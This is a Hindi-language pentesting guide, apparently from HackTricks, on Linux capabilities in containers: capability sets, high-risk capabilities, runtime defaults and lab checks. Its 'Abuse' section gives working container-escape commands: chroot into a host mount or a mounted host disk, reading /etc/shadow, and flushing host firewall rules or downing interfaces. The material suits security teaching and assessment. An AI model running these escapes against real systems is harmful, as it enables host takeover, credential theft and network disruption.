# कंटेनरों में Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## परिचय

Linux capabilities कंटेनर सुरक्षा के सबसे महत्वपूर्ण हिस्सों में से एक हैं क्योंकि ये एक सूक्ष्म लेकिन मौलिक सवाल का उत्तर देती हैं: **कंटेनर के अंदर "root" का असल में क्या मतलब है?** सामान्य Linux सिस्टम पर, UID 0 ऐतिहासिक रूप से व्यापक privileges का संकेत देता था। आधुनिक kernels में, उस privilege को capabilities नामक छोटे यूनिटों में विभाजित किया गया है। एक प्रोसेस root के रूप में चल सकता है और फिर भी कई शक्तिशाली ऑपरेशन्स नहीं कर पाएगा अगर संबंधित capabilities हटा दी गई हों।

Containers इस भेद पर बहुत निर्भर करते हैं। कई workloads अभी भी compatibility या सरलता कारणों से कंटेनर के अंदर UID 0 के रूप में लॉन्च होते हैं। capability dropping के बिना, यह बहुत ज्यादा खतरनाक होगा। capability dropping के साथ, एक containerized root प्रोसेस अभी भी कई सामान्य in-container कार्य कर सकता है जबकि अधिक संवेदनशील kernel ऑपरेशन्स से वंचित रखा जाता है। इसलिए एक container shell जो `uid=0(root)` दिखाता है, वह स्वचालित रूप से "host root" या यहां तक कि "broad kernel privilege" का मतलब नहीं होता। capability सेट तय करते हैं कि उस root पहचान की वास्तविक कीमत कितनी है।

पूर्ण Linux capability संदर्भ और कई दुरुपयोग उदाहरणों के लिए देखें:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## ऑपरेशन

Capabilities को कई सेटों में ट्रैक किया जाता है, जिनमें permitted, effective, inheritable, ambient, और bounding सेट शामिल हैं। कई container assessments के लिए, प्रत्येक सेट के सटीक kernel semantics तुरंत उतने महत्वपूर्ण नहीं होते जितना कि अंतिम व्यावहारिक प्रश्न: **यह प्रोसेस अभी कौन-कौन से privileged ऑपरेशन्स सफलतापूर्वक कर सकता है, और भविष्य में कौन-कौन से privilege प्राप्त करना अभी भी संभव है?**

इस बात का कारण यह है कि कई breakout techniques असल में container समस्याओं के रूप में छुपी capability समस्याएँ हैं। एक workload जिसके पास `CAP_SYS_ADMIN` है, वह बहुत सी kernel functionality तक पहुँच सकता है जिसे एक सामान्य container root प्रोसेस को छूना नहीं चाहिए। एक workload जिसके पास `CAP_NET_ADMIN` है, जब host network namespace भी साझा होता है तो वह कहीं अधिक खतरनाक हो जाता है। एक workload जिसके पास `CAP_SYS_PTRACE` है, वह तब और अधिक दिलचस्प हो जाता है जब वह host PID sharing के माध्यम से host processes देख सकता है। In Docker or Podman that may appear as `--pid=host`; in Kubernetes it usually appears as `hostPID: true`.

दूसरे शब्दों में, capability सेट को अलग-अलग नहीं आंका जा सकता। इसे namespaces, seccomp, और MAC policy के साथ मिलाकर पढ़ा जाना चाहिए।

## लैब

किसी कंटेनर के अंदर capabilities का निरीक्षण करने का एक बहुत ही सीधे तरीका है:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
आप एक अधिक प्रतिबंधात्मक container की तुलना ऐसे container से भी कर सकते हैं जिसमें सभी capabilities जोड़ी गई हों:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
एक संकीर्ण जोड़ का प्रभाव देखने के लिए, सब कुछ हटाकर केवल एक capability वापस जोड़कर देखें:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
ये छोटे प्रयोग दिखाते हैं कि एक runtime सिर्फ "privileged" नामक boolean को टॉगल नहीं कर रहा होता। यह प्रक्रिया के लिए उपलब्ध वास्तविक privilege surface को आकार दे रहा है।

## High-Risk Capabilities

हालाँकि लक्ष्य के अनुसार बहुत सी capabilities मायने रख सकती हैं, कुछ बार-बार container escape विश्लेषण में प्रासंगिक रहती हैं।

**`CAP_SYS_ADMIN`** वह capability है जिसे defenders को सबसे अधिक शक के साथ देखना चाहिए। इसे अक्सर "the new root" कहा जाता है क्योंकि यह बड़ी मात्रा में कार्यक्षमता अनलॉक कर देता है, जिसमें mount-संबंधी operations, namespace-संवेदनशील व्यवहार, और अनेक kernel paths शामिल हैं जिन्हें कभी भी containers को सहजतापूर्वक एक्सपोज़ नहीं किया जाना चाहिए। अगर किसी container के पास `CAP_SYS_ADMIN`, कमजोर seccomp, और कोई मजबूत MAC confinement नहीं है, तो कई क्लासिक breakout paths कहीं अधिक वास्तविक बन जाते हैं।

**`CAP_SYS_PTRACE`** तब मायने रखता है जब process visibility मौजूद हो, खासकर यदि PID namespace host के साथ साझा किया गया है या रोचक पड़ोसी workloads के साथ है। यह visibility को tampering में बदल सकता है।

**`CAP_NET_ADMIN`** और **`CAP_NET_RAW`** नेटवर्क-केंद्रित वातावरणों में महत्वपूर्ण हैं। एक isolated bridge network पर ये पहले से ही रिस्की हो सकते हैं; एक shared host network namespace पर ये कहीं अधिक खतरनाक होते हैं क्योंकि workload host networking को reconfigure कर सकता है, sniff, spoof, या स्थानीय ट्रैफ़िक फ्लो में हस्तक्षेप कर सकता है।

**`CAP_SYS_MODULE`** आम तौर पर rootful वातावरण में विनाशकारी होता है क्योंकि kernel modules को लोड करना प्रभावी रूप से host-kernel नियंत्रण है। यह लगभग कभी भी किसी सामान्य-purpose container workload में नहीं दिखना चाहिए।

## Runtime Usage

Docker, Podman, containerd-based stacks, और CRI-O सभी capability controls का उपयोग करते हैं, पर defaults और management interfaces अलग होते हैं। Docker इन्हें बहुत सीधे flags जैसे `--cap-drop` और `--cap-add` के माध्यम से एक्सपोज़ करता है। Podman समान controls एक्सपोज़ करता है और अक्सर rootless execution से एक अतिरिक्त safety layer का लाभ मिलता है। Kubernetes capability additions और drops को Pod या container `securityContext` के माध्यम से surface करता है। System-container वातावरण जैसे LXC/Incus भी capability control पर निर्भर करते हैं, पर उन प्रणालियों का broader host integration अक्सर operators को defaults को app-container वातावरण की तुलना में अधिक ढीला करने के लिए प्रलोभित करता है।

सभी में वही सिद्धांत लागू होता है: कोई capability जिसे तकनीकी रूप से दिया जा सकता है, जरूरी नहीं कि उसे दिया जाना चाहिए। कई वास्तविक दुनिया की घटनाएँ तब शुरू होती हैं जब कोई operator capability जोड़ देता है केवल इसलिए कि workload stricter configuration में फेल हो रहा था और टीम को एक quick fix चाहिए था।

## Misconfigurations

सबसे स्पष्ट गलती Docker/Podman-style CLIs में **`--cap-add=ALL`** है, पर यह एकमात्र गलती नहीं है। व्यवहार में, एक अधिक सामान्य समस्या यह है कि एक या दो अत्यधिक शक्तिशाली capabilities, विशेषकर `CAP_SYS_ADMIN`, को "application को काम कराने" के लिए दिया जाता है बिना namespace, seccomp, और mount निहितार्थों को समझे। एक और सामान्य विफलता मोड extra capabilities को host namespace sharing के साथ मिलाकर देना है। Docker या Podman में यह `--pid=host`, `--network=host`, या `--userns=host` के रूप में दिख सकता है; Kubernetes में समकक्ष एक्सपोज़र आमतौर पर workload सेटिंग्स जैसे `hostPID: true` या `hostNetwork: true` के माध्यम से दिखाई देता है। इन प्रत्येक संयोजनों से यह बदल जाता है कि capability वास्तव में क्या प्रभावित कर सकती है।

यह भी आम है कि administrators मान लें कि क्योंकि कोई workload पूरी तरह `--privileged` नहीं है, इसलिए यह अभी भी अर्थपूर्ण रूप से constrained है। कभी-कभी यह सच होता है, पर कभी-कभी प्रभावी पोस्चर पहले से ही privileged के काफी नज़दीक होता है कि यह अंतर संचालन स्तर पर महत्वहीन हो जाता है।

## Abuse

पहला व्यावहारिक कदम यह है कि effective capability set को enumerate किया जाए और तुरंत उन capability-specific actions का परीक्षण किया जाए जो escape या host information access के लिए मायने रखती हैं:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
यदि `CAP_SYS_ADMIN` मौजूद है, तो पहले mount-based abuse और host filesystem access का परीक्षण करें, क्योंकि यह सबसे सामान्य breakout enablers में से एक है:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
यदि `CAP_SYS_PTRACE` मौजूद है और container रोचक processes देख सकता है, तो सत्यापित करें कि क्या capability को process inspection में बदला जा सकता है:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
यदि `CAP_NET_ADMIN` या `CAP_NET_RAW` मौजूद है, तो जांचें कि workload दिखाई देने वाले नेटवर्क स्टैक को हेरफेर कर सकता है या कम से कम उपयोगी नेटवर्क खुफिया जानकारी इकट्ठा कर सकता है:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
जब किसी capability टेस्ट में सफलता मिलती है, तो उसे namespace की स्थिति के साथ जोड़ें। एक capability जो अलग namespace में केवल जोखिम भरी दिखती है, वह तुरंत escape या host-recon primitive बन सकती है जब container भी host PID, host network, या host mounts साझा करता हो।

### Full Example: `CAP_SYS_ADMIN` + Host Mount = Host Escape

यदि container के पास `CAP_SYS_ADMIN` है और host filesystem का writable bind mount जैसे `/host` मौजूद है, तो escape का रास्ता अक्सर सीधा होता है:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
अगर `chroot` सफल होता है, तो कमांड अब होस्ट रूट फ़ाइल सिस्टम संदर्भ में निष्पादित होते हैं:
```bash
id
hostname
cat /etc/shadow | head
```
यदि `chroot` उपलब्ध नहीं है, तो अक्सर वही परिणाम mounted tree के माध्यम से binary को कॉल करके प्राप्त किया जा सकता है:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### पूर्ण उदाहरण: `CAP_SYS_ADMIN` + Device Access

यदि host से कोई block device उपलब्ध कराया गया है, तो `CAP_SYS_ADMIN` इसे सीधे host filesystem access में बदल सकता है:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### पूर्ण उदाहरण: `CAP_NET_ADMIN` + Host Networking

यह संयोजन हमेशा सीधे host root प्रदान नहीं करता, लेकिन यह host network stack को पूरी तरह से पुनः कॉन्फ़िगर कर सकता है:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
यह denial of service सक्षम कर सकता है, traffic interception की अनुमति दे सकता है, या उन सेवाओं तक पहुँच प्रदान कर सकता है जो पहले फ़िल्टर की गई थीं।

## Checks

capability checks का उद्देश्य केवल raw values को dump करना नहीं है, बल्कि यह समझना भी है कि क्या process के पास इतना privilege है कि उसका मौजूदा namespace और mount स्थिति खतरनाक बन सके।
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
What is interesting here:

- `capsh --print` उन उच्च-जोखिम capabilities जैसे `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, या `cap_sys_module` का पता लगाने का सबसे आसान तरीका है।
- `/proc/self/status` में `CapEff` लाइन बताती है कि अब वास्तव में क्या प्रभावी है, न कि केवल क्या अन्य सेटों में उपलब्ध हो सकता है।
- यदि container host PID, network, या user namespaces साझा करता है, या उसके पास होस्ट पर लिखने योग्य mounts हैं, तो capability dump और भी अधिक महत्वपूर्ण हो जाता है।

After collecting the raw capability information, the next step is interpretation. जांचें कि process root है या नहीं, user namespaces सक्रिय हैं या नहीं, host namespaces साझा किए गए हैं या नहीं, seccomp लागू है या नहीं, और क्या AppArmor या SELinux अभी भी प्रक्रिया को सीमित करते हैं। एक capability सेट अपने आप कहानी का केवल हिस्सा है, लेकिन अक्सर यही वह हिस्सा होता है जो यह स्पष्ट करता है कि एक container breakout क्यों काम करता है और दूसरा समान दिखने वाले शुरुआती बिंदु पर क्यों विफल होता है।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से capability सेट घटाया हुआ | Docker एक डिफ़ॉल्ट allowlist रखता है और बाकी capabilities हटा देता है | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | डिफ़ॉल्ट रूप से capability सेट घटाया हुआ | Podman containers डिफ़ॉल्ट रूप से unprivileged होते हैं और reduced capability मॉडल का उपयोग करते हैं | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | बदले न जाने पर runtime के डिफ़ॉल्ट्स विरासत में लेता है | यदि कोई `securityContext.capabilities` निर्दिष्ट नहीं है, तो container runtime से डिफ़ॉल्ट capability सेट प्राप्त करता है | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | आम तौर पर runtime डिफ़ॉल्ट | प्रभावी सेट runtime और Pod spec दोनों पर निर्भर करता है | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

For Kubernetes, the important point is that the API does not define one universal default capability set. If the Pod does not add or drop capabilities, the workload inherits the runtime default for that node.
